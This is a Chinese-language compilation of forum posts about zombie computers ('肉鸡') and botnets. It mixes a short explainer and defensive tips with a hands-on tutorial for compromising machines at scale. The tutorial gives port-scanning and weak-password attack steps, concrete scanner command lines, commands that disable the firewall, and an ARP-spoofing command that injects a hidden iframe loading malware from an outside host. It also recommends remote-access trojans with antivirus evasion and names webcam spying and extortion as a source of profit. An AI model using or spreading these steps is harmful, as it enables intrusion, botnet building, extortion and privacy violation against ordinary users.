这个“肉鸡”计算机可远比你吃进肚子里的肉鸡值钱，在黑客圈，肉鸡就象硬通货，就是真金白银。
在电脑中 “肉鸡”还有另一层意思。'被控制者' 这个词我感觉更适合。
一但被人 控制 变成 “肉鸡” 。榨取完您的 资源后 （这个资源 可能是 金钱的 也可能是 心灵的） 就在网络上把你卖掉。1手 2手 3手 N手。您还不知 您只被卖了几毛钱






🔵 ：您是如何变肉鸡的 （三大恶心途径 ）

1，【捆绑】 ，比方说你下载一个迅雷 但是这个迅雷是被黑客 编辑过的 捆绑上了一个病毒。安装迅雷的同时也把病毒装上了。

2，【网页挂马】这个大家都懂，是 菜鸟 是 大虾 都知道！浏览过这个网页就中毒。

3，【漏洞扫描】很多人都说：我电脑 只聊QQ 网页都不打怎么能中毒。还有的人说我只看网络电视 怎么就中毒了！其实听完我下面的话 你就知道个大概了！如果您"光膀子"上网，就是没有任何防护措施，没有杀毒软件和防火墙。您有可能会想，我也不瞎打网站，也不乱安装东西 装杀软还影响速度！不装了！您大错特错了。漏洞扫描 黑客通过 IP段扫描  例如 100个IP 它扫描出 70个开放的。在70个开放中查找弱口令。70个计算机 估计会有20 - 40个 弱口令开放 并自动上传 自动执行。下载恶意插件！病毒以及其他恶意软件。据我所知 黑客扫描 一般都是扫描 世界所有IP段 脱机扫描！大家想想吧！






🔵 ： 抓肉鸡的敛财之道

1， 中毒机器可以干很多事。比如说您控制 1000台肉鸡！理论上也可以说 您有1000个代理服务器 呵呵 质量差一点 不过 还是很好用的。呵呵！配合使用刷百度排名很奏效！

2， DDOS 僵尸网络 1000太肉鸡 也挺强悍了！小型信息港口估计 2秒就灭(我说的是普通防火墙)5000个肉鸡估计低于5万左右的防火钱 2秒也灭。呵呵 几万肉鸡 呵呵 联众领教过。灭 灭 灭。。。。。 攻击收费挺可观的。

3， 早期互联星空问题。早期互联星空可以通过 宽带帐号 购买QQ币。呵呵！您也知道！控制了他电脑。想知道他宽带号，太容易了吧！买吧！送吧！开会员吧！ 让别人付账去吧。现在互联改了。不过这个问题确实存在过。

4， 窃取商业机密，这个用的比较少，不过有人用过。 略过。。

5， 这个是大家都比较感兴趣的，通过控制软件可以录像。有些女孩 尤其是爱QQ宠物的。为了挂级别！电脑24 小时开着，摄像头也不拔掉。就对着她的床。显示器一关就去睡觉。呵呵，您知道吗，姑娘您很有可能被直播了。哈哈。没把影片邮递过去勒索你，你就烧香吧！

6， 价值榨取的差不多了，装点插件也行少点就少点吧！一个命令 1000条计算机在执行 下载并执行 **助手**IE工具条 ****

7， 肉鸡体无完肤了 这个时候 估计1000台计算机有 500个都重新做系统了！没有了！剩余的500台还可以变一点钱，50元 或者 80元 100元 出售。

做完系统以后，可能被人2次扫描 3次扫描到，你现在知道为什么一上网，你的网镖不停的闪是为啥了吧。

[解决办法]

我的方法不能让大家100% 远离病毒，但会大大降低中毒几率。

1，杀毒软件 一定要装 本人推荐 金山+配合金山清理专家  或者 江民配合金山清理专家，其他本人 不看好。种种原因吧

2，杀毒软件一般都带 个人防火墙 设置到高级最好，因为设置到高级 您的IP为PING不通。很难被扫了！

在有杀软时时监控，很难有病毒进来搞你了。平时在注意使用 陌生网址 小心点 用TT浏览器 禁止脚本运行先看看在说。放火强会出现很多东西阻止，大家别嫌弃麻烦。为了安全。以上的方法适合 普通用户如果对计算机了解的够深 防火墙 低就可以 做一下IP策略！也不错！免去了防火墙 蹦的烦恼！

系统补丁一定要打！









肉鸡嘛，要不就是养的，要不就是买的，要不就是抓来的，
肉鸡品种很多，除了服务鸡，还有桌面鸡和手鸡，物联鸡、工控鸡和车载鸡也在崛起的路上了，不同的肉鸡适应不同的顾客口味。

- 每次发布新的0 Day漏洞的时候，全世界的网络流量都要上升几十个百分点，干嘛的呢？漫山遍野跑的都是抓肉鸡的专业户啊，有没有一种“抓肉鸡的人实在太多，肉鸡都不够分了”的感觉？


也别总想着DDoS了，这么粗暴的烹调方法品尝不到肉鸡的鲜味啊，肉鸡不仅可以拿来跑密码、挖矿，还可以传播全家桶、刷应用商店排行，更可以用来进行网络游戏的分布式带宽测试，甚至分布式计算外星人的位置，真是全身都是宝，怎么吃都比暴力攻击强啊，食不厌精，脍不厌细才是肉鸡的正确使用姿势。


我来科普性的回答一下DDoS的这个问题吧。首先DDos是什么：分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。[1]我们可以看到，只要是联网的设备都可以发动攻击，只不过攻击流量的大小有区别罢了，这样我们可以回答楼主的前两个问题了：

DDoS的肉鸡可以来自各种联网的设备（这里不限于终端设备，只要是联网即可），常见的有服务器、个人PC、物联网设备（传感器、摄像头）、手机、路由器等等那么这些设备是怎么获取到的呢？基本上都是通过漏洞被黑客入侵，然后植入相应的被控端。比如个人电脑访问被挂马的网站中木马，或者是运行了被绑马的软件。服务器或者物联网设备由于没有及时更新补丁或者使用了弱口令被入侵种马，或者是被黑客利用漏洞侵入服务器（直接远程溢出或者通过其他服务漏洞控制服务器：例如通过web入侵）




暗网 有大量的 出售ddos 攻击服务.

4、有些可以利用的漏洞甚至你不需要控制肉鸡都能发动攻击
比如：
wordpress的xmlrpc.php
利用xss的DDoS




简单的从600多万telnet中，用60多组密码，扫描出38万个肉鸡


基础设施太脆弱，以至于下面的10个密码，就能控制互联网上10%以上的设备。
123456、123456789、111111
123123、000000、888888
admin、password、P@ssw0rd
123qwe



一个不小心搞出1Tb DDos攻击的安全研究员，只是把自己的小工具Mirai源码公开，和写了个使用指南。而背后的故事也很简单：简单的从600多万telnet中，用60多组密码，扫描出38万个肉鸡。基础设施太脆弱，以至于下面的10个密码，就能控制互联网上10%以上的设备。



大黑都是自写程序，利用一些高危漏洞批量扫描上传木马抓鸡，还有入侵大流量站，网页挂马等等，任何可以远程代码执行的漏洞基本都可以用来抓鸡，当然利用难度也不一样，，


web渗透（文件上传漏洞，sql注入，以及网爆的各种漏洞如bash shock等）方式拿到服务器肉鸡。弱口令批量扫描服务器后门拿到又一批服务器肉鸡。在你控制的web服务器挂马，利用ie，firefox，flash浏览器漏洞对访问web服务的小白抓肉鸡。批量发exe，pdf，doc邮件拿到又一批肉鸡。在应用网站正常应用下载里捆绑木马给用户下载。控制电信网，路由器设备做dns劫持，中间人攻击。开一家类似数字，百度的公司，让大家主动成为你的肉鸡。——————————————————不要查我水表，以上文字摘自《小儿唐诗三百首》



GitHub搜索mirai，最近的DDoS据说就是这个开源软件找的肉鸡




主要都是利用一些端口爆破某一IP或某一服务器，最后成功获取它们的密码，然后......（你懂得）！

主要都是利用一些端口爆破某一IP或某一服务器，最后成功获取它们的密码，然后......（你懂得）！

肉鸡现在成本很低，既可以买来薅羊毛，又可以买来发动攻击。所以，即使是技术不高的人，只要花钱购买肉鸡，从网上下载工具就可以发起攻击。技术含量down!down!down!

ddos早就不需要肉鸡了……

当然像360百度这种公司要搞肉鸡也非常容易。


长期养鸡的我认为有两种人(没有数据助证，只是随便逼逼，水太深，可能是错的)。
一种是大黑，一种是小白
大黑，是鸡中有鸡，一鸡还比一鸡牛。
小白，你站在桥上抓肉鸡，抓肉鸡人在楼上抓你。
跑题了。

总有未知的oday


IE漏洞，flash漏洞， Linux路由器漏洞，网站程序漏洞， wp等各种程序可以由各种原因疏于更新或无法更新


邮件攻击， 网盘内exe，修改器等边缘exe攻击，直接攻击






抓肉鸡先决条件要有一个免杀的远控小马，别的木马也可以，这些很多论坛都有。


 新手可以选择灰鸽子，也可以换个别的木马，如守望者，上兴 ，黑洞 。。。相对容易上手。免杀几乎是一切基础，所以一定要学好免杀，新手朋友要多多学习了，多思考，多动手，多提问，相信你免杀会有很大的进步的，(*^__^*) 嘻嘻……
  这里讲解下原理和方法，不具体操作演示，不方便还要控制下教程的大小，另外重要的是我认为新手朋友应该多自己动手实践下，看别人的教程演示跟着一般的做是不会有什么很大的进步，要学习思路和原理，自己动手实践，在不断的解决困难中进步。我走到今天的一点点感触，和新手分享下。
下面开始正题：




1：扫3389端口抓肉鸡
  
  这个方法比较简单，适合新手朋友。
原理：
      国内流传着一种克隆版的XP，安装后会默认开启一个账号为new,密码为空的账户，而且基本上都是默认开放3389服务的，我们就可以利用这一点来抓肉鸡。
方法：
    扫描工具（如S等等）扫一段IP的3389端口，扫完后就直接用3389连接器连接开放3389的机器，也可以把结果保存为文本，用批量生成3389连接的工具生成链接，比较方便的，然后输入账号new登入，如果别人的电脑前没人的话你就可以去你的空间下载你传好的木马然后安装。
      这种方法只能是XP系统，如果遇到2000或者2003系统就不要试了，除非有输入法漏洞，不过现在很少了，还有那么多的3389，干嘛在它上面浪费时间呢。汗- -！
      这个方法缺点也是大大的，XP只支持单用户登入，，你再登入上去就会把他挤出去，而且不可以抓国外的肉鸡。
建议：中午或者半夜行动，因为有很多的人会开着机子下载，杀毒啊，去睡觉。我们就有可乘之机了。(*^__^*) 嘻嘻……
2：扫135端口抓肉鸡
步骤：A:
      a-先用扫描器扫一段IP的135端口
      
      b-整理一下
      
      c-NTSCAN过滤有弱口令的机器
   
      d-最后用recton开telnet传马
  
      B:
      有一些自动抓鸡工具，功能类似，如Bluisland,Wmi,蜜蜂，知音等等，比较傻瓜化的。
这里简单说两点：Bluisland 木马改名为 boot.exe , IP保存为ip.txt,放在同一个目录下。
                Wmi 需要修改，具体看操作。
问题：因为国内的一些网络运营商屏蔽了一部分的端口，你可能扫不到135，或者扫到的135没有检测到空口令？！怎么办？！
解决：1：你要开了这3个服务就可以开通
        
      我的电脑--管理---服务
      TCP/IP NetBIOS Helper
      Remote Procedure Call (RPC) Locator
      NT LM Security Support Provider  
2：xp打线程补丁 一般线程为1000-3000之间就可以了 如果还扫不到就打4000
打好补丁之后重启。
3：抓鸡前关掉杀软和防火墙（包括系统自带的防火墙）
4：木马一定要免杀 扫的IP范围不要太大 XP系统扫的不是很快 有条件的见意装个2000或者2003系统，可以用syn方式扫
5：换个ip段扫。可以扫下本地的ip段。
6：终极解决方案，拿个服务器扫，这是最好的方法。
  或者在鸽子或者别的肉鸡上扫，上传S扫描器
首先要关防火墙 CMD命令 net stop alg /y 或者net stop sharedaccess
S扫描器命令： s.exe syn《xp的机子为tcp》 开始IP，结束IP 端口 线程/save
              s.exe syn 125.108.0.0 125.108.155.255 1433 700 /save
  3: 扫445端口抓肉鸡
    扫135抓肉鸡差不多，先用扫描器扫一段IP的445端口，然后把结果整理，再用NTSCAN过滤有弱口令的机器，最后开共享传马，可以用啊D工具包。
  屏蔽的话可以扫本地的445试下。
  
  4：1433端口批量溢出抓肉鸡
  
  原理：可以利用漏洞溢出实现全自动抓鸡，不过现在太多人搞，成功率不是很高。
  
  工具：S.exe sqlhello.exe nc.exe 批处理文件
  
  方法:先打开多个NC监听,然后再打开扫描溢出的.bat,然后你就可以去睡觉去了。自动扫描，扫描完后        自动溢出，溢出后自动下马执行。
      这就是批处理的威力，希望大家有时间多专研下，我在论坛发布的有详细的批处理教程文章。
另外有42 21等端口的溢出，原理都是类似的，大家自己尝试下吧。
  
5:  扫1433弱口令抓肉鸡
  工具：端口扫描器 X-scan 和 SQL综合利用工具
  
  原理：开1433端口的机器一般都装有SQL，所以我们可以猜测SQL弱口令来抓1433肉鸡。
  方法：
      先用端口扫描器扫一段IP的1433端口，然后结果保存为文本文件，
      
      接着用X-scan导入这些开了1433的IP，然后在扫描参数-全局设置-扫描模块这一栏里只勾上SQL-SERVER就可以了，其他不要勾。然后在插件设置-端口相关设置-待检测端口这一栏，只填1433端口。然后就可以开始扫描了，扫描完成后会有个报告，列出了有弱口令的机器，
      
      然后打开SQL综合利用工具，输入你扫到的弱口令来连接，接着打开SQL综合利用工具-利用目录，上传你的木马，然后在用DOS命令执行你的木马。
  
    另解：WINNTAutoAttack 原理一样。
  6：扫4899空口令抓肉鸡
  
  工具：扫描器 4899探测器 Radmin
   
  原理： Radmin开放的端口默认为4899.
  方法：先用端口扫描器扫一段IP的4899端口
      
        用4899探测器导入开了4899端口的IP，过滤下
      
        Radmin连接有空口令的机器，带开文件管理，上传运行你木马
  7: 扫5900端口抓VNC肉鸡
    工具：VNC扫描器 VNC连接器
    原理：VNC开放5900端口
   
    方法：先用VNC扫描器扫描一段IP的5900端口，
          扫描格式为vscan.exe（扫描器文件名） -i 219.0.0.0-219.255.255.255（扫描IP段） -p 5900 -vnc -vv  建议扫国外的ip段，国外用这个的比较多，一般机子也不错的。
          扫描完成后会在扫描器所在的同一文件夹生成一个文本文件，打开后有一列IP，IP后面的有一些单词比如patched,banned,vulnerable,只有为vulnerable才能连接。接着就用VNC连接器连接。
  8： ARP局域网欺骗挂马
   
    ARP命令： zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -insert "<iframe src='xx' width=0 height=0>"
这里网马地址就假设为  http://www.***.net/ 那么命令就是
zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -insert "<iframe src='http://www.***.net/' width=0 height=0>"
接上 3389 服务器 服务器必须安装 winPcap.exe 工具都有打包
然后就执行  zxarps.exe -idx 0 -ip 192.168.0.2-192.168.0.99 -port 80 -insert "<iframe src='http://www.***.net/' width=0 height=0>"  IP自己改
  
zxarps.exe是免杀的  先安装WinPcap_4_0.exe 然后运行1.bat的批处理 输入命令zxarps.exe就可以了
这样就可以把马挂上拉 如果拿到一台内网机器 整个机房的机器都可以挂上马
  
    这个方法我还没尝试过，大家可以实验下。听说效果不错的。







　1.135端口抓肉鸡
　　2.1433端口抓肉鸡
　　3.445端口抓肉鸡
　　4.139端口抓肉鸡
　　5.1521端口抓肉鸡
　　6.2967端口抓肉鸡
　　7.4899端口抓肉鸡


怎么用灰鸽子抓肉鸡
用灰鸽子抓肉鸡有两种思路：第一、先用其他方法找到肉鸡，然后把灰鸽子种进去，达到控制肉鸡的目的；第二、利用任何方法让其他人中你的灰鸽子，这样，他的机器成为你的肉鸡；第一种为主动有目的的去做，第二种是等着别人中，是被动型的。





肉鸡: broiler.

